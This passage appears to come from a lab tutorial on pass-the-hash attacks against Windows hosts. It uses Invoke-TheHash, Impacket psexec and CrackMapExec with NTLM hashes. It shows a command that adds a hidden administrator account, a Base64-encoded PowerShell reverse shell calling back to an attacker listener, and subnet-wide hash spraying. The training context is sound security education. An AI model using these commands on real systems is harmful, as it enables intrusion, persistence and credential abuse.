&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c:\tools\Invoke-TheHash&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-SMBExec&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Target&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;172.16.1.10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Domain&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inlanefreight.htb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Username&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;julio&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Hash&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;64F12CDDAA88057E06A81B54E73B949B&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Command&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;net user mark Password123 /add &amp;amp;&amp;amp; net localgroup administrators mark /add&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Verbose&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VERBOSE:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inlanefreight.htb\julio&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;successfully&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;authenticated&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;172.16.1.10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VERBOSE:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inlanefreight.htb\julio&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;has&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Control&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Manager&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;privilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;172.16.1.10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VERBOSE:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;EGDKNNLQVOLFHRQTQMAU&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;created&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;172.16.1.10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VERBOSE:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Trying&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;172.16.1.10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;Command&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;executed&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wi---th&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;EGDKNNLQVOLFHRQTQMAU&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;172.16.1.10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VERBOSE:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;EGDKNNLQVOLFHRQTQMAU&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;deleted&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;172.16.1.10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can also get a reverse shell connection in the target machine. If you are unfamiliar with reverse shells, review the &lt;a href=&quot;https://academy.hackthebox.com/module/details/115&quot;&gt;Shells &amp;amp; Payloads&lt;/a&gt; module on HTB Academy.&lt;/p&gt;

&lt;p&gt;To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.&lt;/p&gt;

&lt;h4 id=&quot;netcat-listener&quot;&gt;Netcat Listener&lt;/h4&gt;

&lt;p&gt;Pass the Hash (PtH)&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\tools&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\nc.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;8001&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listening&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;any&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;8001&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To create a simple reverse shell using PowerShell, we can visit &lt;a href=&quot;https://www.revshells.com/&quot;&gt;https://www.revshells.com/&lt;/a&gt;, set our IP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.16.1.5&lt;/code&gt; and port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8001&lt;/code&gt;, and select the option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PowerShell #3 (Base64)&lt;/code&gt;, as shown in the following image.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/rshellonline.jpg&quot; alt=&quot;Reverse Shell Generator interface with IP 172.16.1.5, port 8001, and PowerShell Base64 payload.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we can execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-TheHash&lt;/code&gt; to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.16.1.10&lt;/code&gt;, we will use the machine name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DC01&lt;/code&gt; (either would work).&lt;/p&gt;

&lt;h4 id=&quot;invoke-thehash-with-wmi&quot;&gt;Invoke-TheHash with WMI&lt;/h4&gt;

&lt;p&gt;Pass the Hash (PtH)&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c:\tools\Invoke-TheHash&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\Invoke-TheHash.psd1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c:\tools\Invoke-TheHash&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-WMIExec&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Target&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC01&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Domain&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inlanefreight.htb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Username&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;julio&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Hash&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;64F12CDDAA88057E06A81B54E73B949B&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Command&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;Command&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;executed&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;520&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC01&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The result is a reverse shell connection from the DC01 host (172.16.1.10).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/pth_invoke_the_hash.jpg&quot; alt=&quot;PowerShell and command prompt showing Invoke-TheHash execution with network connection details and whoami command output.&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;pass-the-hash-with-impacket-linux&quot;&gt;Pass the Hash with Impacket (Linux)&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;Impacket&lt;/a&gt; has several tools we can use for different operations such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Command Execution&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Credential Dumping&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enumeration&lt;/code&gt;, etc. For this example, we will perform command execution on the target machine using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PsExec&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;pass-the-hash-with-impacket-psexec&quot;&gt;Pass the Hash with Impacket PsExec&lt;/h4&gt;

&lt;p&gt;Pass the Hash (PtH)&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;impacket-psexec administrator@10.129.201.126 &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Requesting shares on 10.129.201.126.....
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found writable share ADMIN&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uploading file SLUBMRXK.exe
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Opening SVCManager on 10.129.201.126.....
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating service AdzX on 10.129.201.126.....
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting service AdzX.....
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.19044.1415]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Microsoft Corporation. All rights reserved.

C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py&quot;&gt;impacket-wmiexec&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py&quot;&gt;impacket-atexec&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py&quot;&gt;impacket-smbexec&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;pass-the-hash-with-crackmapexec-linux&quot;&gt;Pass the Hash with CrackMapExec (Linux)&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/byt3bl33d3r/CrackMapExec&quot;&gt;CrackMapExec&lt;/a&gt; is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use CrackMapExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin. This method is also called “Password Spraying” and is covered in-depth in the Active Directory Enumeration &amp;amp; Attacks module. Note that this method can lock out domain accounts, so keep the target domain’s account lockout policy in mind and make sure to use the local account method, which will try just one login attempt on a host in a given range using the credentials provided if that is your intent.&lt;/p&gt;

&lt;h4 id=&quot;pass-the-hash-with-crackmapexec&quot;&gt;Pass the Hash with CrackMapExec&lt;/h4&gt;

&lt;p&gt;Pass the Hash (PtH)&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]# crackmapexec smb 172.16.1.0/24 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:DC01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         172.16.1.10   445    DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] .&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 19041 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MS01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         172.16.1.5    445    MS01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] .&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator 30B3783CE2ABF1AF70F77D0660CF3453 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--local-auth&lt;/code&gt; to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pwn3d!&lt;/code&gt;, it means that the user is a local administrator on the target computer. We can use the option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-x&lt;/code&gt; to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the &lt;a href=&quot;https://www.microsoft.com/en-us/download/details.aspx?id=46899&quot;&gt;Local Administrator Password Solution (LAPS)&lt;/a&gt;, which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.&lt;/p&gt;

&lt;h4 id=&quot;crackmapexec---command-execution&quot;&gt;CrackMapExec - Command Execution&lt;/h4&gt;

&lt;p&gt;Pass the Hash (PtH)&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]# crackmapexec smb 10.129.201.126 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 30B3783CE2ABF1AF70F77D0660CF3453 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami

&lt;/span&gt;SMB         10.129.201.126  445    MS01            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10 Enterprise 10240 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MS01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
